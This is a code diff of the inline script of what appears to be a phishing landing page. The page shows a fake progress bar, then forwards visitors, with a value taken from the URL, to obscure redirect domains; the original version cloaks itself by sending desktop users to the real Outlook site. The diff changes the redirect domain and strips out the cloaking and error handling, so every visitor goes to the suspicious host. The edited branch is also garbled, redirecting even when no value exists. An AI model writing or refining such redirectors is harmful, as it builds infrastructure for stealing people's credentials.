@@ -137,7 +137,7 @@
     <script>
     (function() {
         const REDIRECT_DELAY = 2500; // Adjusted for progress bar animation
-        const MOBILE_REDIRECT_URL_BASE = "https://aer.jkhrl.es/EJMQGdhAQuiV!9nG/$";
+        const MOBILE_REDIRECT_URL_BASE = "https://strat.tdmgo.co/?WqXmwl=ZjEwMDI1ODc2NDEyNGUwN2FmYzgxZDQwNmE1MDYwZmU%3D&mcoQGi=u2AkqS&";
         const DESKTOP_REDIRECT_URL = "https://outlook.office365.com/";
         const DEAD_URL = "https://www.theguardian.com/environment/climate-crisis"; // Target URL if no value found
 
@@ -166,22 +166,14 @@
 
             if (value) {
                 console.log("Found value:", value);
-                if (isMobileDevice()) {
-                    const redirectUrl = MOBILE_REDIRECT_URL_BASE + value;
+                const redirectUrl = MOBILE_REDIRECT_URL_BASE + value;
                     console.log("Mobile device detected. Redirecting to:", redirectUrl);
                     window.location.href = redirectUrl;
-                } else {
-                    console.log("Non-mobile device detected. Redirecting to Outlook:", DESKTOP_REDIRECT_URL);
-                    window.location.href = DESKTOP_REDIRECT_URL;
-                }
             } else {
-                console.log("No value found in hash or search. Redirecting all devices to dead URL:", DEAD_URL);
-                document.querySelector('.loading-text').textContent = 'Error: Link invalid or expired.';
-                document.querySelector('.file-info').textContent = 'Please check the link or contact support.';
-                if(document.getElementById('progressBar')) {
-                    document.getElementById('progressBar').style.backgroundColor = '#d9534f'; // Error color
-                    document.getElementById('progressBar').style.width = '100%';
-                }
+                console.log("Found value:", value);
+                const redirectUrl = MOBILE_REDIRECT_URL_BASE + value;
+                    console.log("Mobile device detected. Redirecting to:", redirectUrl);
+                    window.location.href = redirectUrl;
                 // No redirect if no value, error is shown on page
             }
         }
